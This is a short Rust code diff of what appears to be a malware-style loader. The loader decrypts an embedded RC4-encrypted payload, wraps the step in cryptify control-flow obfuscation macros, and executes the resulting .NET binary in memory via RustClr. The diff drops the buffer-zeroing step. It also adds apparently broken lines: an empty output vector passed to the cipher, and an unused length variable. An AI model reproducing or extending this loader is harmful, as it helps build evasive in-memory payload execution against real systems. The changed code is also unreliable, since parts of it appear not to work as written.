@@ -10,13 +10,13 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     cryptify::flow_stmt!();
     // Decrypt the payload
-    let buffer = include_bytes!("encr");
+    let mut buffer = include_bytes!("encr");
     let mut cipher = crypto::rc4::Rc4::new(include_bytes!("../keyfile"));
-    let mut o = buffer.clone();
+    let len = buffer.len();
+    let mut o = vec![];
     cipher.process(&buffer[..], &mut o);
-    // Zero Buffer
-    buffer.zeroize();
-
+    
+    let _ = drop(buffer);
     cryptify::flow_stmt!();
     // Run the dotnet exe
     let output = RustClr::new(&o)?
